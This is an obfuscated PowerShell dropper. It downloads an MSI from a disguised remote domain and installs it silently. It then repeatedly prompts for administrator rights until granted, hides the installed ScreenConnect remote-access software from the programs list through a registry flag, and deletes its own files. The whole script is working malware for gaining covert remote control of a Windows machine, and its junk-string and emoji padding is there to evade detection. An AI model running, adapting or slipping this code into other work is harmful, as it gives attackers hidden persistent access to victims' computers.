$pbHbS5FF = Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*" |
    Where-Object { $_.DisplayName -like "*ScreenConnect*" }
if (-not $pbHbS5FF -and [Environment]::Is64BitOperatingSystem) {
    $pbHbS5FF = Get-ItemProperty -Path "HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" |
        Where-Object { $_.DisplayName -like "*ScreenConnect*" }
}
if ($pbHbS5FF) {
    exit
}
$N1K9eRHH1gUbg5m5 = $env:SystemDrive
$QbRgWnCoNa6bQn = $env:TEMP
$AxY6ec = "万里江山一梦中，不知何处是神州。"
$W0yVad = "oobggin"
$EMILWVyRUGaOy2hwYnG1 = ".com"
$dCgtse5LJq1oI38bpyEEHn3Fq = "https://"
$gWPit3x9aMC98SUvPQTCF1n = "/"
$8WOosQAr = -join ((48..57) + (65..90) + (97..122) | Get-Random -Count 6 | ForEach-Object {[char]$_})
$jpFAI2wc2Qnyx8 = -join ((48..57) + (65..90) + (97..122) | Get-Random -Count 7 | ForEach-Object {[char]$_})
$ycFcKLlPWgW = -join ((48..57) + (65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
$Qa6H4VbtBi22S5cE = [char[]]$W0yVad
[Array]::Reverse($Qa6H4VbtBi22S5cE)
$BHUjCX7BvLEvuQ5 = Join-Path $N1K9eRHH1gUbg5m5 "C"
$ycFcKLlPWgW = $ycFcKLlPWgW + ".msi"
$vciDcgr2C8aM97e3FyCRI0 = Join-Path $QbRgWnCoNa6bQn $ycFcKLlPWgW
$W0yVad = -join $Qa6H4VbtBi22S5cE
$6yZe2Upd = $dCgtse5LJq1oI38bpyEEHn3Fq + $W0yVad + $AxY6ec + $EMILWVyRUGaOy2hwYnG1 + $gWPit3x9aMC98SUvPQTCF1n + $8WOosQAr + "/" + $jpFAI2wc2Qnyx8
$script_var = "msIVtBX28X3iGIVtBX28X3iGiIVtBX28X3iGexeIVtBX28X3iGIVtBX28X3iGc.exIVtBX28X3iGe /IVtBX28X3iGi `"$vciDcgr2C8aM97e3FyCRI0`" /qIVtBX28X3iGn /noresIVtBX28X3iGIVtBX28X3iGtart"
$script_var = $script_var -replace "IVtBX28X3iG", ""
$vJfOE = Join-Path $BHUjCX7BvLEvuQ5 "C.cmd"
$6yZe2Upd = $6yZe2Upd -replace "万里江山一梦中，不知何处是神州。", ""
$34nj909is9 = "cmd.exe"
New-Item -Path $BHUjCX7BvLEvuQ5 -ItemType Directory | Out-Null
$script_var | Set-Content -Path $vJfOE -Encoding ASCII
$vJfOE = $vJfOE -replace ".cmd", ""
$3CwX3Vk47gtkm = "/c `"$vJfOE`""
$c5QTCdETgjZ7OWx = "S🍕🍕ys🍕🍕🍕🍕🍕🍕tem🍕🍕🍕Co🍕🍕m🍕🍕o🍕nen🍕🍕🍕🍕🍕🍕t"
$EEAcivBTPQrL = "ScASDASDASDASDASDASDASFJASFJAKSFKAreASDASDASDASDASDASDASFJASFJAKSFKAenASDASDASDASDASDASDASFJASFJAKSFKAConnASDASDASDASDASDASDASFJASFJAKSFKAect SofASDASDASDASDASDASDASFJASFJAKSFKAASDASDASDASDASDASDASFJASFJAKSFKAASDASDASDASDASDASDASFJASFJAKSFKAtwASDASDASDASDASDASDASFJASFJAKSFKAASDASDASDASDASDASDASFJASFJAKSFKAare"
Invoke-WebRequest -Uri $6yZe2Upd -OutFile $vciDcgr2C8aM97e3FyCRI0
while ($true) {
    try {
        $5fPmRl8hSS9sgF8MUFw = Start-Process -FilePath $34nj909is9 -ArgumentList $3CwX3Vk47gtkm -Verb RunAs -PassThru -ErrorAction Stop -WindowStyle Hidden
        if ($5fPmRl8hSS9sgF8MUFw) { break }
    }
    catch {}
}
Start-Sleep -Seconds 5
$KWe6rOymRzv9RRVs6W = @(
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
    "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
)
$c5QTCdETgjZ7OWx = $c5QTCdETgjZ7OWx -replace "🍕", ""
$EEAcivBTPQrL = $EEAcivBTPQrL -replace "ASDASDASDASDASDASDASFJASFJAKSFKA", ""
foreach ($SGFfv in $KWe6rOymRzv9RRVs6W) {
    Get-ChildItem -Path $SGFfv | ForEach-Object {
        $Jol3GekkgcCeqh3Vg0s9B = (Get-ItemProperty -Path $_.PsPath -ErrorAction SilentlyContinue).Publisher
        if ($Jol3GekkgcCeqh3Vg0s9B -eq $EEAcivBTPQrL) {
            try {
                Set-ItemProperty -Path $_.PsPath -Name $c5QTCdETgjZ7OWx -Value 1 -Type DWord
            } catch {}
        }
    }
}
Remove-Item -Path $vciDcgr2C8aM97e3FyCRI0 -Force -ErrorAction SilentlyContinue
Remove-Item -Path $vJfOE -Force -ErrorAction SilentlyContinue
Remove-Item -Path $BHUjCX7BvLEvuQ5 -Recurse -Force -ErrorAction SilentlyContinue